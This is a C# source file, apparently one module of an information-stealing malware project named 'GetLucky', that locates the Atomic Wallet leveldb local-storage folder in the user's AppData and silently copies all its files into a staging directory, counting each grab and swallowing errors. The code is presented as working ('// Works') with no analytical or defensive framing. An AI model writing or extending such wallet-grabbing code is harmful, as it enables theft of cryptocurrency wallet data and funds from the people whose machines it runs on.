using System.IO;

namespace GetLucky
{
    class AtomicWallet
    {
        public static int count = 0;
        //AtomicWallet, AtomicWallet 2.8.0
        public static string atomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";
        public static string atomDir2 = Help.AppDate + "\\atomic\\Local Storage\\leveldb\\";
        public static void AtomicStr(string directorypath)  // Works
        {
            try
            {
                if (Directory.Exists(atomDir2))
                {
                    foreach (FileInfo file in new DirectoryInfo(atomDir2).GetFiles())

                    {
                        Directory.CreateDirectory(directorypath + atomDir);
                        file.CopyTo(directorypath + atomDir + file.Name);
                    }
                    count++;
                    Wallets.count++;
                }
                else
                {
                    return;
                }



            }
            catch { }

        }
    }
}
